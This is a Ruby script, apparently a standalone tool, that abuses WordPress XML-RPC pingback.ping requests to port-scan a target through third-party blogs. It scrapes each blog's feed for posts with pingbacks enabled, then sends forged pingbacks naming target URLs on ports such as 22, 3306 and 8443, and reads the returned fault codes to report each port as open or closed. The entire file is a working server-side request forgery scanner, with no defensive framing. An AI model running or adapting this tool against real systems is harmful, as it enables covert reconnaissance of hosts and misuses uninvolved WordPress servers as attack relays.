require "typhoeus"

def generate_pingback_xml (target, valid_blog_post)
  xml = "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>"
  xml << "<methodCall>"
  xml << "<methodName>pingback.ping</methodName>"
  xml << "<params>"
  xml << "<param><value><string>#{target}</string></value></param>"
  xml << "<param><value><string>#{valid_blog_post}</string></value></param>"
  xml << "</params>"
  xml << "</methodCall>"
  xml
end

def get_valid_blog_post(xml_rpcs)
  blog_posts = []
  xml_rpcs.each do |xml_rpc|
    url = xml_rpc.sub(/\/xmlrpc\.php$/, "")
    # Get valid URLs from Wordpress Feed
    feed_url = "#{url}/feed/"
    response = Typhoeus::Request.get(feed_url, {:follow_location => true})
    links = response.body.scan(/<link>([^<]+)<\/link>/i)
    if response.code != 200 or links.nil?
      raise("No valid blog posts found for xmlrpc #{xml_rpc}")
    end
    links.each do |link|
      temp_link = link[0]
      # Test if pingback is enabled for extracted link
      pingback_xml = generate_pingback_xml("http://www.google.com", temp_link)
      pingback_response = Typhoeus::Request.post(xml_rpc, {:follow_location => true, :timeout => 5000, :method => :post, :body => pingback_xml})
      # No Pingback for post enabled: <value><int>33</int></value>
      pingback_disabled_match = pingback_response.body.match(/<value><int>33<\/int><\/value>/i)
      if pingback_response.code == 200 and pingback_disabled_match.nil?
        puts "Found valid post under #{temp_link}"
        blog_posts << {:xml_rpc => xml_rpc, :blog_post => temp_link}
        break
      end
    end
  end
  blog_posts
end

def generate_requests(hydra, xml_rpcs, target)
  %w(21 22 25 53 80 106 110 143 443 3306 8443).each do |i|
    random = (0...8).map{65.+(rand(26)).chr}.join
    xml_rpc_hash = xml_rpcs.sample
    url = "#{target}:#{i}/#{random}/"
    xml = generate_pingback_xml(url, xml_rpc_hash[:blog_post])
    request = Typhoeus::Request.new(xml_rpc_hash[:xml_rpc], :body => xml, :method => :post)
    request.on_complete do |response|
      # Closed: <value><int>16</int></value>
      closed_match = response.body.match(/<value><int>16<\/int><\/value>/i)
      if closed_match.nil?
        puts "Port #{i} is open"
        if @debug
          puts "##################################"
          puts xml
          puts response.body
        end
      else
        puts "Port #{i} is closed"
      end
    end
    hydra.queue(request)
  end
end

@debug = false
hydra = Typhoeus::Hydra.new(:max_concurrency => 10)
#xml_rpcs = %w(http://10.211.55.8/wordpress/xmlrpc.php http://192.168.1.6/wordpress/xmlrpc.php)
xml_rpcs = %w(http://10.211.55.8/wordpress/xmlrpc.php)
target = "http://localhost"

puts "Getting valid blog posts for pingback..."
hash = get_valid_blog_post(xml_rpcs)
puts "Starting portscan..."
generate_requests(hydra, hash, target)
hydra.run
